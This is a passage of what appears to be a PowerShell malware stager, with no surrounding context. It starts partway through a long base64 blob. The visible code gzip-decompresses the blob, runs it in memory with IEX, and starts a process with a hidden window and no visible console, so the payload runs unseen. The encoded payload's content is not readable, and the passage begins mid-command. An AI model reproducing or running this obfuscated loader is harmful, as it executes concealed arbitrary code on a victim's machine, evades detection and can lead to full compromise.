OPlHrHqwtNEICLBXBZwaOyHnRkgJAUz/pN7SE4BnWQ9ZyjAeaR0uar7fgv0/P6ty8cK8b05ouzFXgoXpUb9U6ZrdWKy4all2UVrkurzt12SrfTacWqvX6Qzmqo9otzT0Mi5t5g26sJnKHK/18Y2yWOWO1mfquNzQ9z7/wrF7+S4U2B6WukSvgplmOmwNjaeSKUZkua13a7z40KvJ+aDPc93T/Lv8V01VTTO08b23qCFWDM2fT8Oxq0HLXw5r+dVB8QGWESmHZrhj8emgI1NFt7Nt88JgT+gDYMJwWJaNuv2J0uxUD9avTR/Or7kPsHQ6MgV2go/ldL4B5BVK41nPFOiDPh10AqcoR9nvg45cKTuCBj/kZGZ/bPCrgB4MjA3wqo0fIazivdBjYb/sFjmzWvsOoOVpXdD0/7BRRLUcHVR8lS2Lf6GIULcyNqedtl7uDL+2hp9t37EI3S7dzx9N1fVkzr51RfnV5c3HZHFB7xlFf1+1PiUJAIinZp51Co2wecf7WVd/CIgowAy3A9X2ozQoXlf1d3OE0iVDVp/78QERIGPQ06HoHbSPGuJN0hhc3N3SnXc+YQKH2YXhWeHWkKU+O2nPTOLy6uhpBxlAtT1LONknoyyCTW53lcnDz51bFHBz9/Uct8flafV4vk7SPJ9Be7MS2O2lJSaV417pplHqroND4/4Hd13QAP+57gX1+9xvru8DOZZ7h+MX08sV/Av6PoBhgKsHbgvuJkV3v/D0ie1UdfX8cUQeq8fZP8kF4E8vTNnyd/AsSXdN6iAoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);